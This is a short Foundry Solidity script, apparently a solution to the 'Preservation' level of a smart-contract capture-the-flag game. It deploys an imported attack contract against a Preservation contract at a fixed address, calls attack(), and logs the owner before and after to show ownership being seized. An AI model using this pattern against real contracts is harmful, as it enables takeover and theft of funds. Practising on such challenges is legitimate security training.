// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Preservation} from "../src/level16/Preservation.sol";
import {AttackPreservation} from "../src/level16/AttackPreservation.sol";

import "forge-std/console.sol";

contract level16Exploit is Script {
    Preservation preservation =
        Preservation(0x355Ae08bf3e93cA040323E4132fd29a3514844e6);

    function run() external {
        vm.startBroadcast();
        console.log("Owner", preservation.owner());
        AttackPreservation attackpreservaton = new AttackPreservation(
            address(preservation)
        );

        attackpreservaton.attack();

        console.log("Owner", preservation.owner());
        vm.stopBroadcast();
    }
}
